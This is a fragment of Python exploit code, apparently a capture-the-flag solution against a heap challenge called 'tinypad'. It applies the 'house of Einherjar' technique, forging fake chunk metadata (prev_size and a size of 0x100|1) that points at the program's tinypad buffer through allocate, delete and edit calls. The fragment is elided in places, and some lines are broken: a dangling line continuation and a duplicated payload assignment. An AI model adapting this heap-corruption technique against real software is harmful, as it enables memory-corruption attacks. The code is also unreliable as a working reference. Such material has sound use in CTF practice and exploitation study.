...
def houseofEinherjar(offset):
    ...
    '''
    delete(1)
    add(0x100, 0x90*"a" + p64(0x90))

    fake_prev_size = offset # - 0x40
    ...
    clearpayload = p64(0x0) + p64(0x100 | 0x1 ) + p64(elf.symbols['tinypad'])*2 #+ \
    fake_chunk_payload2 = p64(0x0) + p64(0x100 | 0x1 ) + p64(elf.symbols['tinypad'])*2 #+ \
    ...
    #    payload = "a"*0x2f
    #    edit(4, payload[:-i])
    editclear(1, "a"*0x100 , fake_chunk_payload2)
